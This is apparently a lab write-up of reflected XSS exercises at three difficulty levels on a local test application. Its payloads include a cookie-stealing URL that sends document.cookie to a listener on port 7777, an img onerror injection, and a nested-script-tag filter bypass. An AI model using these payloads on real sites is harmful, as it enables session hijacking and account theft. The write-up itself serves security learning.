# XSS (Cross-Site Scripting)

XSS is a web vulnerability where an attacker injects malicious JavaScript into a website, and that script runs in the victim's browser.

Basically, the site trusts user input, the attacker tricked the user for example by sending a link that puts JS on that input, and the victim's browser executes it.

## Reflected XSS

Reflected XSS happens when:

A malicious input is sent in a request (URL, form, header) and the server immediately reflects it in the response so the victim's browser executes it.

So basically it happens in the server, not in the browser like DOM XSS.

## Objective

One way or another, steal the cookie of a logged in user.

## LOW

The website has a feature, you enter your name and it displays `Hello $yourname`.

<img width="1575" height="317" alt="Screenshot from 2026-02-07 17-49-01" src="https://github.com/user-attachments/assets/4ccee155-8f7d-4b2c-9849-39f0ee0be009" />

So let's try entering something more interesting than just a name, something like: `<script>alert(document.cookie)</script>` that will print my cookies.

<img width="1575" height="317" alt="Screenshot from 2026-02-07 17-49-52" src="https://github.com/user-attachments/assets/e2d24f1f-bd08-4913-8acf-c20fcbc1744c" />


And it's working because there is no sanitization.

Now let's steal the cookies, so I'll need an HTTP server that acts as a listener: `python3 -m http.server 7777`, and a well-crafted malicious link:
```
http://localhost:8000/vulnerabilities/xss_r/?name=%3Cscript%3Ewindow.location=%27http://0.0.0.0:7777/?cookie=%27%20+%20document.cookie%3C/script%3E
```

And a good way to convince the victim to click my link.

If they're not cautious enough, this is what will happen:

<img width="1918" height="127" alt="Screenshot from 2026-02-07 17-56-15" src="https://github.com/user-attachments/assets/9b6decae-a312-409c-b8b3-13fe3819e8b3" />

## MEDIUM

The dev team added blacklisting to remove any references to `<script>`, in order to prevent JS execution.

So let's find a way to steal those delicious cookies without using `<script>`.

Using the same technique I used in the DOM XSS Medium level (onerror payload): `<img src/onerror = alert(document.cookie)>`

<img width="1532" height="874" alt="Screenshot from 2026-02-07 18-00-19" src="https://github.com/user-attachments/assets/75d98f28-e0c5-4e37-83f2-bf154b94d806" />

And since they are just removing occurrences of `<script>`, we can inject: `<scr<script>ipt>alert(document.cookie)</script>`, so after deletion of `<script>` we still have our working payload.

## HIGH

The developer now believes they can disable all JavaScript by removing the pattern `<s*c*r*i*p*t>`. Even upper letters won't work.

So we can use the same technique we used in Medium level: `<img src/onerror = alert(document.cookie)>`

<img width="1498" height="920" alt="Screenshot from 2026-02-07 18-06-48" src="https://github.com/user-attachments/assets/fa6982a9-26ca-455d-994f-639bd8c6f652" />
